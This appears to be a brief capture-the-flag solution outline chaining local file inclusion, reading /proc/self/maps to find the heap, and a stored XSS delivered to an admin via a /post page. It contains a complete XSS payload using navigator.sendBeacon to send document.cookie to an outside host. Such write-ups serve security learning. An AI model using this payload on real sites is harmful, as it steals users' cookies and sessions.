Key point: LFI, memory read, XSS

* Implement local file inclusion by using URL encoding in `/:t/:s/:e` page.
* Find the memory layout (heap) address by getting `/proc/self/maps`.
* Write the XSS payload to memory by making a post request to the `/identify` page with `username=<script>navigator.sendBeacon('//'+document.cookie.substr(13,100).replace('}','')+'ip');</script>`.
* Search the heap page address for the given string, like `ip`.
* Send the URL that reads the contents of the heap to the admin by `/post` page.
